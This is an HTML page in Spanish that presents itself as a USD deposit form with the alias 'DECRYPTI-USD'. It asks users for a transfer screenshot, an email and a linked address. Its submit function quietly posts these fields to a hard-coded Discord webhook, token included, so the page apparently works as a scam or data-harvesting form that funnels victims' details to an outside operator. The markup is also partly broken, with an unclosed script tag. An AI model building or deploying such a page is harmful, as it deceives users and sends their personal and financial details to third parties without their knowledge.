<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Depósito de USD</title>
    <style>
       body {
    background: linear-gradient(to bottom, #4a148c, #880e4f);
    color: #ffffff;
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 0;
}

.container {
    width: 100%;
    max-width: 500px;
    margin: 100px auto;
    padding: 40px;
    background-color: rgba(0, 0, 0, 0.8);
    border: 2px solid #00ff00;
    border-radius: 10px;
    text-align: center;
}

.input-group {
    margin-bottom: 20px;
    text-align: left;
}

.btn {
    background-color: #00ff00;
    color: #222;
    padding: 10px 20px;
    border: none;
    border-radius: 5px;
    cursor: pointer;
}

.btn-copiar {
    background-color: #ff00ff;
    margin-left: 10px;
}

.mensaje-copiado {
    color: #ff00ff;
    display: none;
}

    </style>
    

</head>
<body>
   <div class="container">
        <div class="input-group">
            <label for="alias">Alias de Depósito:</label>
            <input type="text" id="alias" value="DECRYPTI-USD" readonly>
            <button class="btn btn-copiar" onclick="copiarAlias()">Copiar</button>
            <span id="mensaje-copiado" class="mensaje-copiado">Copiado!</span>
        </div>
        <div class="input-group">
        <label for="captura">Captura del Envío:</label>
        <input type="file" id="captura">
    </div>

    <div class="input-group">
        <label for="correo">Correo Electrónico:</label>
        <input type="email" id="correo">
    </div>

    <div class="input-group">
        <label for="address">Dirección Vinculada:</label>
        <input type="text" id="address">
    </div>

    <button class="btn" onclick="procesarDeposito()">Enviar</button>

    <div id="mensaje-procesando" class="mensaje-procesando"></div>

    <script>
function procesarDeposito() {
            // Obtener los valores de los campos del formulario
            var captura = document.getElementById("captura").value;
            var correo = document.getElementById("correo").value;
            var address = document.getElementById("address").value;

            // Crear un objeto con los datos del formulario
            var datos = {
                captura: captura,
                correo: correo,
                address: address
            };

            // Enviar los datos a tu webhook de Discord
            fetch('https://discordapp.com/api/webhooks/1099001430674784376/NDajDoUsRC042nVrw8PkhOw589lybj_lx7Fv8qdfZ5e6e9Pd9s59QtBULxdoDCOn7rtc', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(datos)
            })
            .then(response => response.json())
            .then(data => {
                // Manejar la respuesta del servidor si es necesario
                console.log(data);
            })
            .catch(error => {
                // Manejar errores si los hay
                console.error('Error:', error);
            });
        }

    function mostrarMensaje(mensaje) {
        var mensajeFlotante = document.getElementById("mensaje-copiado");
        mensajeFlotante.textContent = mensaje;
        mensajeFlotante.style.display = "inline";
    }

    function mostrarError(mensaje) {
        var mensajeFlotante = document.getElementById("mensaje-copiado");
        mensajeFlotante.textContent = mensaje;
        mensajeFlotante.style.color = "#ff0000";
        mensajeFlotante.style.display = "inline";
    }

    function copiarAlias() {
        var alias = document.getElementById("alias");
        alias.select();
        document.execCommand("copy");
        var mensajeCopiado = document.getElementById("mensaje-copiado");
        mensajeCopiado.style.display = "inline";
    }

</body>
</html>
